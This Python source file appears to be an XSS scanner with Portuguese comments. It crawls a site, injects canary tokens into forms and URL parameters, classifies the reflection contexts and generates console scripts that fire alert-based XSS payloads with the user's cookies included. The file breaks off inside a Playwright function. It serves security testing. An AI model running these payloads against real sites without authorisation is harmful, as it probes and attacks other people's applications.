#!/usr/bin/env python3
"""XssRecon Auto Validate

Scanner de revisão para superfícies XSS/reflexão com validação automática segura.

O que muda nesta versão:
- Submete formulários automaticamente com um canary único por campo.
- Testa parâmetros existentes em URLs automaticamente.
- Classifica reflexões por contexto: texto HTML, atributo, script, evento, href/src etc.
- Reduz a necessidade de revisar cada input manualmente.
- Mantém itens DOM/JS como "indicadores" quando não há reflexão confirmada.
- Exporta resultado em JSON e/ou CSV.
- Para indicadores DOM/JS e reflexões confirmadas, gera comandos de console com veredito automático.

Limite honesto: sem navegador/headless, o script não prova execução real sozinho.
Por isso, ele gera um helper de console para validar execução/recebimento em sinks no navegador.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import html as html_lib
import json
import random
import re
import string
import sys
from datetime import datetime, timezone
from collections import deque
from dataclasses import asdict, dataclass, replace
from http.cookies import SimpleCookie
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

try:
    import requests
    from bs4 import BeautifulSoup, Comment
    from bs4.element import NavigableString, Tag
    from colorama import Back, Fore, Style, init
    from requests import Response
    from requests.exceptions import RequestException, SSLError, Timeout
except ModuleNotFoundError as exc:
    missing = exc.name or "dependência"
    raise SystemExit(
        f"Dependência ausente: {missing}. Instale com: pip install requests beautifulsoup4 colorama"
    ) from exc

init(autoreset=True)

VERSION = "12.0-readable-results"
DEFAULT_TIMEOUT = 10
DEFAULT_MAX_PAGES = 50
SUPPORTED_SCHEMES = {"http", "https"}
HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

USER_DATA_SINKS = {
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "execScript(",
    "location.search",
    "location.hash",
    "location.href",
    "window.name",
    "postMessage(",
}

DANGEROUS_SCHEMES = ("javascript:", "data:text/html", "vbscript:")
TEXT_LIKE_TYPES = {
    "text", "search", "url", "email", "tel", "password", "hidden", "number", "date", "datetime-local"
}
SKIP_INPUT_TYPES = {"submit", "button", "image", "reset", "file", "checkbox", "radio"}


@dataclass(frozen=True)
class ReviewItem:
    category: str
    confidence: str
    risk: str
    context: str
    page_url: str
    target_url: str
    method: str
    form_index: int
    field_name: str
    payload: str
    evidence: str
    notes: str
    manual_console_test: str = ""
    test_url: str = ""
    execution_status: str = "not_tested"
    execution_evidence: str = ""
    content_hash: str = ""


@dataclass
class ScanStats:
    pages: int = 0
    forms: int = 0
    requests: int = 0
    errors: int = 0
    review_items: int = 0
    confirmed_reflections: int = 0
    high_risk_reflections: int = 0
    sinks: int = 0
    auto_tests: int = 0


class UI:
    @staticmethod
    def banner() -> None:
        c = Fore.CYAN + Style.BRIGHT
        w = Fore.WHITE + Style.BRIGHT
        r = Fore.RED + Style.BRIGHT
        print(
            f"""
{c} ██╗  ██╗███████╗███████╗    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
{c} ╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
{c}  ╚███╔╝ ███████╗███████╗    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
{c}  ██╔██╗ ╚════██║╚════██║    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
{c} ██╔╝ ██╗███████║███████║    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
{c} ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝

        {w}Recon Audit Engine {c}v{VERSION} {r}[AUTO VALIDATE]
        {Style.DIM}{'-' * 72}
        """
        )

    @staticmethod
    def line() -> None:
        print(Fore.BLACK + Style.BRIGHT + "─" * 72)

    @staticmethod
    def title(label: str, color: str = Fore.MAGENTA) -> None:
        print(f"\n{Back.BLACK}{color}{Style.BRIGHT} >> {label} {Style.RESET_ALL}")

    @staticmethod
    def info(message: str) -> None:
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {message}")

    @staticmethod
    def ok(message: str) -> None:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")

    @staticmethod
    def warn(message: str) -> None:
        print(f"{Fore.YELLOW}[WARN]{Style.RESET_ALL} {message}")

    @staticmethod
    def item(level: str, message: str) -> None:
        if level == "high":
            prefix = Back.RED + Fore.WHITE + Style.BRIGHT + " CONFIRMED/HIGH "
        elif level == "medium":
            prefix = Back.YELLOW + Fore.BLACK + Style.BRIGHT + " CONFIRMED "
        elif level == "interesting":
            prefix = Back.CYAN + Fore.BLACK + Style.BRIGHT + " INDICATOR "
        else:
            prefix = Back.WHITE + Fore.BLACK + " INFO "
        print(f"\n{prefix}{Style.RESET_ALL} {message}")

    @staticmethod
    def progress(current: int, total: int) -> None:
        percent = min((current / max(total, 1)) * 100, 100)
        filled = int(percent / 5)
        bar = "█" * filled + "░" * (20 - filled)
        print(f"{Fore.CYAN}[SCANNING] |{bar}| {current}/{total} páginas", end="\r")


def get_content_hash(text: str) -> str:
    return hashlib.md5(text.encode("utf-8", errors="ignore")).hexdigest()


def short_text(text: object, max_len: int = 160) -> str:
    normalized = " ".join(str(text).split())
    if len(normalized) <= max_len:
        return normalized
    return normalized[: max_len - 3] + "..."


def random_token(prefix: str = "XSSRECON") -> str:
    suffix = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    return f"{prefix}_{suffix}"


def is_supported_url(url: str) -> bool:
    parsed = urlparse(url)
    return parsed.scheme in SUPPORTED_SCHEMES and bool(parsed.netloc)


def normalize_url(base_url: str, link: str) -> str:
    candidate = urljoin(base_url, link or "").split("#", 1)[0].rstrip("/")
    return candidate


def same_host(url_a: str, url_b: str) -> bool:
    return urlparse(url_a).netloc == urlparse(url_b).netloc


def attr_to_text(value: object) -> str:
    if isinstance(value, list):
        return " ".join(str(v) for v in value)
    return str(value)


def is_html_response(response: Response) -> bool:
    content_type = response.headers.get("Content-Type", "")
    return "html" in content_type.lower() or not content_type


def build_review_item(
    *,
    category: str,
    confidence: str,
    risk: str,
    context: str,
    page_url: str,
    target_url: str,
    method: str,
    form_index: int,
    field_name: str,
    payload: str,
    evidence: str,
    notes: str,
    hash_seed: str,
    manual_console_test: str = "",
    test_url: str = "",
    execution_status: str = "not_tested",
    execution_evidence: str = "",
) -> ReviewItem:
    return ReviewItem(
        category=category,
        confidence=confidence,
        risk=risk,
        context=context,
        page_url=page_url,
        target_url=target_url,
        method=method,
        form_index=form_index,
        field_name=field_name,
        payload=payload,
        evidence=evidence,
        notes=notes,
        manual_console_test=manual_console_test,
        test_url=test_url,
        execution_status=execution_status,
        execution_evidence=execution_evidence,
        content_hash=get_content_hash(hash_seed),
    )



def js_string(value: str) -> str:
    return json.dumps(value, ensure_ascii=False)



def build_dom_console_verdict_test(page_url: str) -> str:
    """Gera helper de console que tenta validar execução/recebimento do payload por sinks DOM."""
    safe_url = js_string(page_url)
    return (
        "(async () => {\n"
        "  const CANARY = 'XSSRECON_DOM_' + Date.now();\n"
        "  const PAYLOAD = `<img src=x onerror=alert('${CANARY}')>`;\n"
        "  const triggered = [];\n"
        "  const log = (type, detail) => triggered.push({ type, detail: String(detail).slice(0, 300) });\n"
        "  const original = { alert: window.alert, confirm: window.confirm, prompt: window.prompt, eval: window.eval, Function: window.Function, write: document.write, writeln: document.writeln, insertAdjacentHTML: Element.prototype.insertAdjacentHTML };\n"
        "  window.alert = function (msg) { if (String(msg).includes(CANARY)) log('EXECUTION', 'alert executado com canary'); return original.alert.apply(this, arguments); };\n"
        "  window.confirm = function (msg) { if (String(msg).includes(CANARY)) log('EXECUTION', 'confirm executado com canary'); return false; };\n"
        "  window.prompt = function (msg) { if (String(msg).includes(CANARY)) log('EXECUTION', 'prompt executado com canary'); return null; };\n"
        "  window.eval = function (code) { if (String(code).includes(CANARY)) log('DANGEROUS_SINK', 'eval recebeu o payload'); return original.eval.apply(this, arguments); };\n"
        "  window.Function = function (...args) { if (args.some(a => String(a).includes(CANARY))) log('DANGEROUS_SINK', 'Function recebeu o payload'); return original.Function.apply(this, args); };\n"
        "  document.write = function (...args) { if (args.some(a => String(a).includes(CANARY))) log('DANGEROUS_SINK', 'document.write recebeu o payload'); return original.write.apply(this, args); };\n"
        "  document.writeln = function (...args) { if (args.some(a => String(a).includes(CANARY))) log('DANGEROUS_SINK', 'document.writeln recebeu o payload'); return original.writeln.apply(this, args); };\n"
        "  Element.prototype.insertAdjacentHTML = function (pos, html) { if (String(html).includes(CANARY)) log('DANGEROUS_SINK', 'insertAdjacentHTML recebeu o payload'); return original.insertAdjacentHTML.apply(this, arguments); };\n"
        "  for (const prop of ['innerHTML', 'outerHTML']) { const desc = Object.getOwnPropertyDescriptor(Element.prototype, prop); if (desc && desc.set) Object.defineProperty(Element.prototype, prop, { set(value) { if (String(value).includes(CANARY)) log('DANGEROUS_SINK', `${prop} recebeu o payload`); return desc.set.call(this, value); }, get: desc.get, configurable: true }); }\n"
        "  window.name = PAYLOAD; location.hash = encodeURIComponent(PAYLOAD); window.dispatchEvent(new HashChangeEvent('hashchange'));\n"
        "  const fields = [...document.querySelectorAll('input, textarea, select')];\n"
        "  for (const el of fields) { try { el.value = PAYLOAD; el.dispatchEvent(new Event('input', { bubbles: true })); el.dispatchEvent(new Event('change', { bubbles: true })); el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: 'Enter' })); el.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, key: 'Enter' })); } catch (e) {} }\n"
        "  const nodes = [...document.querySelectorAll('*')].filter(el => [...el.attributes].some(a => a.name.startsWith('on') || (a.name === 'href' && a.value.trim().toLowerCase().startsWith('javascript:'))));\n"
        "  for (const el of nodes) { try { el.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true })); el.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, key: 'Enter' })); el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: 'Enter' })); } catch (e) {} }\n"
        "  await new Promise(r => setTimeout(r, 800));\n"
        "  const htmlReflection = document.documentElement.outerHTML.includes(CANARY);\n"
        "  console.table(nodes.map((el, i) => ({ index: i, tag: el.tagName, id: el.id || '', name: el.getAttribute('name') || '', handlers: [...el.attributes].filter(a => a.name.startsWith('on') || a.name === 'href').map(a => `${a.name}=${a.value}`).join(' | ').slice(0, 300) })));\n"
        "  console.log('URL base analisada:', " + safe_url + "); console.log('Payload usado:', PAYLOAD); console.log('Reflexão no DOM atual:', htmlReflection ? 'SIM' : 'NÃO'); console.table(triggered);\n"
        "  if (triggered.some(x => x.type === 'EXECUTION')) console.error('VEREDITO: DOM XSS CONFIRMADO. Houve execução do payload.');\n"
        "  else if (triggered.length > 0 || htmlReflection) console.warn('VEREDITO: POSSÍVEL DOM XSS. Payload chegou a sink/reflexão, mas execução automática não foi confirmada.');\n"
        "  else console.info('VEREDITO: NÃO CONFIRMADO. Há superfície suspeita, mas este teste não comprovou DOM XSS.');\n"
        "})();"
    )



def choose_execution_payload(marker: str, context: str) -> str:
    """Escolhe payload controlado conforme o contexto refletido."""
    ctx = (context or "").lower()
    if "script" in ctx or "event-handler" in ctx or "javascript-url" in ctx:
        return f"';alert('{marker}');//"
    if "attribute" in ctx:
        return f'\"><svg/onload=alert("{marker}")>'
    return f'<svg/onload=alert("{marker}")>'


def url_with_payload(item_url: str, field_name: str, payload: str) -> str:
    parsed = urlparse(item_url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    field_name = field_name or "xssrecon"
    found = False
    new_params = []
    for k, v in params:
        if k == field_name:
            new_params.append((k, payload))
            found = True
        else:
            new_params.append((k, v))
    if not found:
        new_params.append((field_name, payload))
    return urlunparse(parsed._replace(query=urlencode(new_params)))


def build_reflection_test_target(item_url: str, method: str, field_name: str, context: str) -> Tuple[str, str, str]:
    marker = "XSSRECON_EXEC_" + random_token("").strip("_")
    payload = choose_execution_payload(marker, context)
    if (method or "GET").upper() == "POST":
        return f"POST {item_url} | {field_name or 'xssrecon'}={payload}", payload, marker
    return url_with_payload(item_url, field_name or "xssrecon", payload), payload, marker

def build_reflection_console_test(item_url: str, method: str, field_name: str, token: str, context: str) -> str:
    """Gera helper de console para retestar reflexão com payload executável e trazer veredito."""
    method = (method or "GET").upper()
    marker = "XSSRECON_EXEC_" + random_token("").strip("_")
    ctx = (context or "").lower()
    if "script" in ctx or "event-handler" in ctx or "javascript-url" in ctx:
        payload = f"';alert('{marker}');//"
    elif "attribute" in ctx:
        payload = f'\"><img src=x onerror=alert("{marker}")>'
    else:
        payload = f'<img src=x onerror=alert("{marker}")>'

    safe_url = js_string(item_url)
    safe_field = js_string(field_name or "xssrecon")
    safe_payload = js_string(payload)
    safe_marker = js_string(marker)
    safe_context = js_string(context)
    safe_token = js_string(token)

    if method == "POST":
        return (
            "(async () => {\n"
            f"  const target = {safe_url}; const field = {safe_field}; const payload = {safe_payload}; const marker = {safe_marker}; const context = {safe_context}; const originalCanary = {safe_token};\n"
            "  console.log('[XssRecon] Contexto original:', context); console.log('[XssRecon] Canary original:', originalCanary); console.log('[XssRecon] Payload de execução:', payload);\n"
            "  const body = new URLSearchParams(); body.set(field, payload); let reflected = false;\n"
            "  try { const r = await fetch(target, { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body }); const t = await r.text(); reflected = t.includes(marker) || t.includes(payload); console.log('[XssRecon] Status HTTP:', r.status); console.log('[XssRecon] Payload refletido na resposta:', reflected ? 'SIM' : 'NÃO'); if (reflected) console.warn('VEREDITO PARCIAL: REFLEXÃO CONFIRMADA VIA POST. Para provar execução, a página precisa renderizar essa resposta no navegador.'); else console.info('VEREDITO: NÃO CONFIRMADO nesta tentativa POST. Pode haver CSRF token/campos obrigatórios faltando.'); } catch (e) { console.error('[XssRecon] Falha no fetch POST:', e); }\n"
            "  console.warn('[XssRecon] Teste visual opcional: será criado um FORM POST em nova aba. Se popup bloquear, permita popup ou remova target=_blank para testar na aba atual.');\n"
            "  const f = document.createElement('form'); f.method = 'POST'; f.action = target; f.target = '_blank'; f.style.display = 'none'; const i = document.createElement('input'); i.name = field; i.value = payload; f.appendChild(i); document.body.appendChild(f); f.submit();\n"
            "})();"
        )

    return (
        "(async () => {\n"
        f"  const target = new URL({safe_url}, location.href); const field = {safe_field}; const payload = {safe_payload}; const marker = {safe_marker}; const context = {safe_context}; const originalCanary = {safe_token};\n"
        "  target.searchParams.set(field, payload);\n"
        "  console.log('[XssRecon] Contexto original:', context); console.log('[XssRecon] Canary original:', originalCanary); console.log('[XssRecon] URL de teste:', target.href);\n"
        "  let reflected = false;\n"
        "  try { const r = await fetch(target.href, { credentials: 'include' }); const t = await r.text(); reflected = t.includes(marker) || t.includes(payload); console.log('[XssRecon] Status HTTP:', r.status); console.log('[XssRecon] Payload refletido na resposta:', reflected ? 'SIM' : 'NÃO'); } catch (e) { console.warn('[XssRecon] Fetch falhou; seguindo com abertura no navegador:', e); }\n"
        "  const oldAlert = window.alert; window.alert = (msg) => { if (String(msg).includes(marker)) console.error('VEREDITO: XSS REFLETIDO CONFIRMADO. alert executado com o marker.'); return oldAlert.apply(window, arguments); };\n"
        "  const w = window.open(target.href, 'xssrecon_exec_test');\n"
        "  if (!w) { console.warn('Popup bloqueado. Abra manualmente esta URL para validar execução:', target.href); if (reflected) console.warn('VEREDITO PARCIAL: REFLEXÃO CONFIRMADA, mas execução não testada por bloqueio de popup.'); return; }\n"
        "  let tries = 0; const timer = setInterval(() => { tries++; try { w.alert = (msg) => { if (String(msg).includes(marker)) console.error('VEREDITO: XSS REFLETIDO CONFIRMADO. alert executado na janela de teste.'); return oldAlert.call(w, msg); }; const html = w.document && w.document.documentElement ? w.document.documentElement.outerHTML : ''; if (html.includes(marker) || html.includes(payload)) { console.warn('VEREDITO PARCIAL: payload renderizado na janela. Se não houve alert, pode estar escapado ou em contexto não executável.'); clearInterval(timer); } } catch (e) { console.warn('Não foi possível inspecionar a janela de teste, possivelmente por origem/política do navegador. Valide visualmente se houve alert.'); clearInterval(timer); } if (tries > 20) { if (reflected) console.warn('VEREDITO PARCIAL: REFLEXÃO CONFIRMADA, mas sem execução observada.'); else console.info('VEREDITO: NÃO CONFIRMADO nesta tentativa.'); clearInterval(timer); } }, 250);\n"
        "})();"
    )


def build_manual_console_test(page_url: str, evidence: str, context: str) -> str:
    """Compatibilidade: para indicadores DOM/JS, retorna o helper com veredito automático."""
    return build_dom_console_verdict_test(page_url)

def reflection_risk(context: str) -> Tuple[str, str]:
    """Return risk/confidence based on where the canary appeared."""
    if context in {"script-body", "event-handler", "javascript-url", "raw-script-like"}:
        return "high", "high"
    if context in {"attribute", "html-comment"}:
        return "medium", "medium"
    if context in {"html-text", "raw-html"}:
        return "low", "medium"
    return "low", "low"


def find_contextual_reflections(html: str, url: str, token: str, *, field_name: str, target_url: str, method: str, form_index: int) -> List[ReviewItem]:
    """Find where token is reflected and classify the context.

    This does not execute JavaScript. It gives an automated triage level so the analyst
    does not need to inspect every sink manually.
    """
    if not token or token not in html:
        return []

    items: List[ReviewItem] = []
    soup = BeautifulSoup(html, "html.parser")
    escaped_token = html_lib.escape(token)

    # Text node / comment / script context
    for node in soup.find_all(string=lambda s: s and (token in str(s) or escaped_token in str(s))):
        parent = node.parent.name.lower() if getattr(node, "parent", None) and node.parent else "unknown"
        node_text = str(node)
        if isinstance(node, Comment):
            context = "html-comment"
        elif parent == "script":
            context = "script-body"
        elif parent == "style":
            context = "style-body"
        else:
            context = "html-text"
        risk, confidence = reflection_risk(context)
        items.append(build_review_item(
            category="Auto Validated Reflection",
            confidence=confidence,
            risk=risk,
            context=context,
            page_url=url,
            target_url=target_url,
            method=method,
            form_index=form_index,
            field_name=field_name,
            payload=token,
            evidence=f"<{parent}>...{short_text(node_text)}...</{parent}>",
            notes="Canary refletido automaticamente na resposta.",
            manual_console_test=build_reflection_console_test(target_url, method, field_name, token, context),
            test_url=build_reflection_test_target(target_url, method, field_name, context)[0],
            hash_seed=f"ctx-ref:{url}:{target_url}:{method}:{field_name}:{context}:{node_text}",
        ))

    # Attribute context
    for element in soup.find_all(True):
        assert isinstance(element, Tag)
        for attr, raw_value in element.attrs.items():
            value = attr_to_text(raw_value)
            if token not in value and escaped_token not in value:
                continue
            attr_lower = str(attr).lower()
            value_lower = value.lower()
            if attr_lower.startswith("on"):
                context = "event-handler"
            elif value_lower.strip().startswith(DANGEROUS_SCHEMES):
                context = "javascript-url"
            else:
                context = "attribute"
            risk, confidence = reflection_risk(context)
            items.append(build_review_item(
                category="Auto Validated Reflection",
                confidence=confidence,
                risk=risk,
                context=f"{context}:{attr}",
                page_url=url,
                target_url=target_url,
                method=method,
                form_index=form_index,
                field_name=field_name,
                payload=token,
                evidence=f"<{element.name} {attr}=\"{short_text(value)}\">",
                notes="Canary refletido automaticamente em atributo HTML.",
                manual_console_test=build_reflection_console_test(target_url, method, field_name, token, f"{context}:{attr}"),
                test_url=build_reflection_test_target(target_url, method, field_name, f"{context}:{attr}")[0],
                hash_seed=f"attr-ref:{url}:{target_url}:{method}:{field_name}:{attr}:{value}",
            ))

    # Raw fallback, useful when parser misses malformed HTML
    if not items:
        for match in re.finditer(re.escape(token), html):
            start = max(0, match.start() - 80)
            end = min(len(html), match.end() + 80)
            snippet = html[start:end].replace("\n", " ")
            before = html[max(0, match.start() - 20):match.start()].lower()
            after = html[match.end():min(len(html), match.end() + 20)].lower()
            context = "raw-script-like" if "<script" in before or "</script" in after else "raw-html"
            risk, confidence = reflection_risk(context)
            items.append(build_review_item(
                category="Auto Validated Reflection",
                confidence=confidence,
                risk=risk,
                context=context,
                page_url=url,
                target_url=target_url,
                method=method,
                form_index=form_index,
                field_name=field_name,
                payload=token,
                evidence=f"...{short_text(snippet)}...",
                notes="Canary refletido automaticamente no HTML bruto.",
                manual_console_test=build_reflection_console_test(target_url, method, field_name, token, context),
                hash_seed=f"raw-ref:{url}:{target_url}:{method}:{field_name}:{match.start()}:{token}",
            ))

    return items


def analyze_static_dom(soup: BeautifulSoup, page_url: str) -> List[ReviewItem]:
    """Static indicators that are not automatically exploitable by themselves."""
    items: List[ReviewItem] = []

    for element in soup.find_all(True):
        assert isinstance(element, Tag)
        for attr, raw_value in element.attrs.items():
            value = attr_to_text(raw_value)
            value_lower = value.lower().strip()
            attr_lower = str(attr).lower()

            if value_lower.startswith(DANGEROUS_SCHEMES) or attr_lower.startswith("on"):
                items.append(build_review_item(
                    category="Static Indicator",
                    confidence="low",
                    risk="info",
                    context=f"dangerous-attr:{attr}",
                    page_url=page_url,
                    target_url=page_url,
                    method="GET",
                    form_index=0,
                    field_name="",
                    payload="",
                    evidence=f"<{element.name} {attr}=\"{short_text(value)}\">",
                    notes="Indicador estático. Não é XSS confirmado sem entrada controlada pelo usuário.",
                    hash_seed=f"attr-sink:{page_url}:{attr}:{value_lower}",
                    manual_console_test=build_manual_console_test(page_url, f"<{element.name} {attr}=\"{short_text(value)}\">", f"dangerous-attr:{attr}"),
                ))

        if element.name == "script":
            script_content = element.string or element.get_text() or ""
            if not script_content:
                continue
            if any(sink in script_content for sink in USER_DATA_SINKS):
                items.append(build_review_item(
                    category="Static Indicator",
                    confidence="low",
                    risk="info",
                    context="js-sink",
                    page_url=page_url,
                    target_url=page_url,
                    method="GET",
                    form_index=0,
                    field_name="",
                    payload="",
                    evidence=f"<script>...{short_text(script_content)}...</script>",
                    notes="Sink JS identificado. Requer entrada controlável para confirmação automática.",
                    hash_seed=f"script-sink:{page_url}:{script_content}",
                    manual_console_test=build_manual_console_test(page_url, script_content, "js-sink"),
                ))

    return items


def extract_links(soup: BeautifulSoup, page_url: str, same_host_only: bool) -> Set[str]:
    links: Set[str] = set()
    for tag in soup.find_all("a", href=True):
        candidate = normalize_url(page_url, tag["href"])
        if not is_supported_url(candidate):
            continue
        if same_host_only and not same_host(page_url, candidate):
            continue
        links.add(candidate)
    return links


def fetch_page(session: requests.Session, url: str, timeout: int, verify_ssl: bool) -> Optional[Response]:
    try:
        return session.get(url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
    except Timeout:
        UI.warn(f"Timeout ao acessar {url}")
    except SSLError:
        UI.warn(f"Falha SSL ao acessar {url}")
    except RequestException as exc:
        UI.warn(f"Erro de request em {url}: {exc}")
    return None


def submit_request(
    session: requests.Session,
    method: str,
    url: str,
    data: Dict[str, str],
    timeout: int,
    verify_ssl: bool,
) -> Optional[Response]:
    try:
        if method.upper() == "POST":
            return session.post(url, data=data, timeout=timeout, verify=verify_ssl, allow_redirects=True)
        return session.get(url, params=data, timeout=timeout, verify=verify_ssl, allow_redirects=True)
    except Timeout:
        UI.warn(f"Timeout ao validar {method} {url}")
    except SSLError:
        UI.warn(f"Falha SSL ao validar {method} {url}")
    except RequestException as exc:
        UI.warn(f"Erro ao validar {method} {url}: {exc}")
    return None


def form_field_value(tag: Tag, token: str) -> Optional[str]:
    field_type = str(tag.get("type", "text")).lower()
    if field_type in SKIP_INPUT_TYPES:
        return None
    if tag.name == "select":
        option = tag.find("option")
        return str(option.get("value") or option.text or token) if option else token
    if tag.name == "textarea":
        return token
    if field_type in TEXT_LIKE_TYPES:
        return token
    return str(tag.get("value") or token)


def auto_validate_forms(
    session: requests.Session,
    soup: BeautifulSoup,
    page_url: str,
    timeout: int,
    verify_ssl: bool,
    max_tests_per_page: int,
    stats: ScanStats,
) -> Tuple[List[ReviewItem], int]:
    items: List[ReviewItem] = []
    form_count = 0
    tests_done = 0

    for idx, form in enumerate(soup.find_all("form"), start=1):
        form_count += 1
        if tests_done >= max_tests_per_page:
            break
        action = normalize_url(page_url, form.get("action") or page_url)
        method = str(form.get("method", "get")).upper()
        if method not in {"GET", "POST"}:
            method = "GET"

        fields: List[Tuple[str, Tag]] = []
        base_data: Dict[str, str] = {}
        for tag in form.find_all(["input", "textarea", "select"]):
            if not isinstance(tag, Tag):
                continue
            field_name = tag.get("name")
            if not field_name:
                continue
            value = form_field_value(tag, "baseline")
            if value is None:
                continue
            fields.append((str(field_name), tag))
            base_data[str(field_name)] = str(tag.get("value") or "")

        for field_name, tag in fields:
            if tests_done >= max_tests_per_page:
                break
            token = random_token()
            data = dict(base_data)
            data[field_name] = form_field_value(tag, token) or token
            response = submit_request(session, method, action, data, timeout, verify_ssl)
            stats.requests += 1
            stats.auto_tests += 1
            tests_done += 1
            if response is None:
                stats.errors += 1
                continue
            if not is_html_response(response):
                continue
            items.extend(find_contextual_reflections(
                response.text,
                response.url.rstrip("/"),
                token,
                field_name=field_name,
                target_url=action,
                method=method,
                form_index=idx,
            ))

    return items, form_count


def url_with_single_param(url: str, param: str, token: str) -> str:
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    new_params = [(k, token if k == param else v) for k, v in params]
    return urlunparse(parsed._replace(query=urlencode(new_params)))


def auto_validate_url_params(
    session: requests.Session,
    page_url: str,
    timeout: int,
    verify_ssl: bool,
    max_tests_per_page: int,
    stats: ScanStats,
) -> List[ReviewItem]:
    parsed = urlparse(page_url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return []

    items: List[ReviewItem] = []
    for index, (param, _) in enumerate(params, start=1):
        if index > max_tests_per_page:
            break
        token = random_token()
        test_url = url_with_single_param(page_url, param, token)
        response = fetch_page(session, test_url, timeout, verify_ssl)
        stats.requests += 1
        stats.auto_tests += 1
        if response is None:
            stats.errors += 1
            continue
        if not is_html_response(response):
            continue
        items.extend(find_contextual_reflections(
            response.text,
            response.url.rstrip("/"),
            token,
            field_name=param,
            target_url=test_url,
            method="GET",
            form_index=0,
        ))
    return items


def scan_page(
    session: requests.Session,
    stats: ScanStats,
    url: str,
    timeout: int,
    verify_ssl: bool,
    same_host_only: bool,
    auto_validate: bool,
    static_indicators: bool,
    max_tests_per_page: int,
) -> Tuple[List[ReviewItem], Set[str]]:
    items: List[ReviewItem] = []
    response = fetch_page(session, url, timeout, verify_ssl)
    stats.requests += 1

    if response is None:
        stats.errors += 1
        return items, set()
    if not is_html_response(response):
        return items, set()

    final_url = response.url.rstrip("/")
    soup = BeautifulSoup(response.text, "html.parser")
    links = extract_links(soup, final_url, same_host_only)

    if static_indicators:
        items.extend(analyze_static_dom(soup, final_url))

    if auto_validate:
        form_items, form_count = auto_validate_forms(
            session, soup, final_url, timeout, verify_ssl, max_tests_per_page, stats
        )
        param_items = auto_validate_url_params(
            session, final_url, timeout, verify_ssl, max_tests_per_page, stats
        )
        items.extend(form_items)
        items.extend(param_items)
        stats.forms += form_count
    else:
        stats.forms += len(soup.find_all("form"))

    return items, links


def deduplicate_items(items: Iterable[ReviewItem]) -> List[ReviewItem]:
    seen: Set[str] = set()
    deduped: List[ReviewItem] = []
    for item in items:
        if item.content_hash in seen:
            continue
        seen.add(item.content_hash)
        deduped.append(item)
    return deduped


def crawl_site(
    session: requests.Session,
    start_url: str,
    depth: int,
    max_pages: int,
    timeout: int,
    verify_ssl: bool,
    same_host_only: bool,
    auto_validate: bool,
    static_indicators: bool,
    max_tests_per_page: int,
) -> Tuple[List[ReviewItem], ScanStats]:
    stats = ScanStats()
    visited: Set[str] = set()
    queue = deque([(start_url.rstrip("/"), 0)])
    collected: List[ReviewItem] = []

    while queue and stats.pages < max_pages:
        url, current_depth = queue.popleft()
        if current_depth > depth or url in visited:
            continue
        if not is_supported_url(url):
            continue

        visited.add(url)
        stats.pages += 1
        UI.progress(stats.pages, max_pages)

        page_items, links = scan_page(
            session=session,
            stats=stats,
            url=url,
            timeout=timeout,
            verify_ssl=verify_ssl,
            same_host_only=same_host_only,
            auto_validate=auto_validate,
            static_indicators=static_indicators,
            max_tests_per_page=max_tests_per_page,
        )
        collected.extend(page_items)

        for link in sorted(links):
            if link not in visited:
                queue.append((link, current_depth + 1))

    print()
    deduped = deduplicate_items(collected)
    stats.review_items = len(deduped)
    stats.confirmed_reflections = sum(1 for item in deduped if item.category == "Auto Validated Reflection")
    stats.high_risk_reflections = sum(1 for item in deduped if item.category == "Auto Validated Reflection" and item.risk == "high")
    stats.sinks = sum(1 for item in deduped if item.category == "Static Indicator")
    return deduped, stats



def _playwright_cookies_from_session(session: requests.Session, target_url: str) -> List[dict]:
    parsed = urlparse(target_url)
    host = parsed.hostname or ""
    cookies = []
    for c in session.cookies:
        domain = c.domain or host
        if domain.startswith("."):
            domain = domain[1:]
        cookies.append({
            "name": c.name,
            "value": c.value,
            "domain": domain or host,
            "path": c.path or "/",
            "secure": bool(c.secure),
            "httpOnly": False,
            "sameSite": "Lax",
        })
    return cookies


def validate_reflection_item_with_browser(item: ReviewItem, session: requests.Session, timeout: int, verify_ssl: bool, headless: bool) -> ReviewItem:
    if item.category != "Auto Validated Reflection" or not item.field_name:
        return item

    marker = "XSSRECON_EXEC_" + random_token("").strip("_")
    payload = choose_execution_payload(marker, item.context)
    method = (item.method or "GET").upper()
    browser_target = url_with_payload(item.target_url, item.field_name, payload) if method == "GET" else f"POST {item.target_url} | {item.field_name}={payload}"

    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
    except ModuleNotFoundError:
        return replace(item, test_url=browser_target, execution_status="browser_missing", execution_evidence="Playwright não instalado. Use: pip install playwright && python -m playwright install chromium")

    dialogs: List[str] = []
    reflected_in_dom = False
    status = "not_confirmed"
    evidence = "Sem execução de alert/prompt/confirm observada."

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=headless)
